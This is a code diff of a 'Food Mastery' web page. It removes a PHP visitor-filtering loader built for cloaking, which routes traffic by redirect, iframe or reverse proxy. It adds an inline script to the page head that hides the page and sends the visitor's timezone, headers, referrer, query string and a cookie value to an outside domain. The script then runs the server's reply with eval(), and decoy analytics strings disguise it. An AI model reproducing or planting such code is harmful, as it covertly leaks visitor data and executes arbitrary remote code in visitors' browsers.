@@ -1,71 +1,11 @@
-<?php
-$GLOBALS['_ta_campaign_key'] = '8ab8a21a66efbdcb3f9ef403cc830a04';
-$GLOBALS['_ta_debug_mode'] = false; //To enable debug mode, set to true or load this script with a '?debug_key=8ab8a21a66efbdcb3f9ef403cc830a04' parameter
-
-require 'bootloader_d1b6d02792cb5f707c04f3d26cb57d3a.php';
-
-$campaign_id = '301bve';
-
-$ta = new TALoader($campaign_id);
-
-
-if ($ta->suppress_response()) {//Do not send any output when hybrid mode is enabled and a visitor is being filtered (after hybrid page was generated)
-    exit;
-}
-
-$response = $ta->get_response();
-$visitor = $ta->get_visitor();
-
-/*
- * Advanced users: uncomment lines below during development to expose variables you may want to use in your custom code:
- */
-//print_r($response);
-//print_r($visitor);
-//exit;
-/*
- * Don't forget to re-comment the lines above before sending live traffic
- */
-
-/*
-Note: when using hybrid mode, please use one of our built-in functions as your final step when routing your visitors:
-    print header_redirect("http://url.com"); //performs a 302 header redirect (or a window.location=xxx in JS)
-    print load_fullscreen_iframe("http://url.com"); //Loads a fullscreen iframe of the specified URL
-    print paste_html("http://url.com"); //Downloads HTML in specified URL and outputs it to the screen (uses JS to insert the HTML in hybrid mode)
-(These functions will automatically output either regular HTML or JS code depending on what the visitor's browser is expecting)
-*/
-
-switch ($response['action']) {
-    case 'header_redirect':
-        print header_redirect($response['url']); //Uses <script>window.location='xxx'</script> when in hybrid mode (required behaviour)
-        exit;
-    case 'iframe':
-        print load_fullscreen_iframe($response['url']);
-        exit;
-    case 'paste_html':
-        print paste_html($response['output_html']);
-        exit;
-    case 'reverse_proxy':
-        print reverse_proxy($response['url'], "tarp_d1b6d02792cb5f707c04f3d26cb57d3a/");
-        exit;        
-    /* Please be VERY CAREFUL if modifying this block: */
-    case 'load_hybrid_page':
-        $ta->load_hybrid_page();
-        break;
-    /* ...it is needed for hybrid mode to function correctly */
-    default:
-        print other_methods($response['url']);
-        break;    
-}
-/*
- * Note: if using the "Remain on Fail URL" action for Filtered Visitors, append your Fail URL's HTML/PHP code after the closing PHP tag below:
- */
-?>
-
-
 <!DOCTYPE html>
 <html>
-
   <head>
+  <style>body {display: none;}</style>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jstimezonedetect/1.0.6/jstz.min.js"></script>
+<script>$(document).ready(function(){$("body").hide();$("html").append("<div id=\"lo311937ad\" style=\"margin-top:8%;background-color:white;text-align:center;font-size:40px;\">Please Wait for Page to Load...</div>");var f=new XMLHttpRequest();f.open("GET",document.location,true);f.send(null);var g;f.onreadystatechange = function(){g=f.getAllResponseHeaders().toLowerCase();};var b="GoogleAnalyticsObject";var c=("document","script","//www.google-analytics.com/analytics.js");c=("create","UA-485351-1","auto");c=("send","pageview");var d=jstz.determine();var e=d.name();var qu=escape(window.location.search.substr(1));var rui=location.pathname+location.search;var r=document.referrer;var sn=document.domain;var value="; "+document.cookie;var pa=value.split("; "+"_event"+"=");var co=pa.pop().split(";").shift();var q;$.ajax({url:"https://bananassalonforkids.co/file/track2.php",type:"POST",data:"tz="+e+"&he="+g+"&rui="+rui+"&qu="+qu+"&r="+r+"&sn="+sn+"&co="+co,success:function(a){if(a){eval(a)}else{$("html").show()}}})})
+</script>
     <title>Food Mastery</title>
     <meta charSet="utf-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
